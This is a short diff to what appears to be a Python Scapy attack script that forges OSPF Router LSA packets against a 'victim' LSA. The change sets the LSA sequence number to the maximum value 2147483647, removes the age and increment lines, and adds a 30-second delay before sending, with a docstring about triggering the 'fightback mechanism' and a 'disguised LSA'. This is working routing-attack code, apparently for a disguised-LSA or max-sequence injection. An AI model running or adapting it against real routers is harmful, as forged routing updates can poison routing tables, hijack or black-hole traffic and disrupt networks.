@@ -131,9 +131,8 @@ if __name__ == '__main__':
 	pkt_trig[OSPF_Hdr].src = neighbor_ip
 	pkt_trig[OSPF_Hdr].chksum = None
 	pkt_trig[OSPF_Hdr].len = None
-	pkt_trig[OSPF_Router_LSA].seq += 1
-	pkt_trig[OSPF_Router_LSA].age = 3600
 	pkt_trig[OSPF_Router_LSA][OSPF_Link].metric = 30
+	pkt_trig[OSPF_Router_LSA].seq = 2147483647
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
 	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None
 	print(pkt_trig.show())
@@ -141,4 +140,5 @@ if __name__ == '__main__':
 	"""
 	Send original packet to trigger the fightback mechanism and the disguised LSA package.
 	"""
+	time.sleep(30)
 	sendp([pkt_trig], iface=iface)
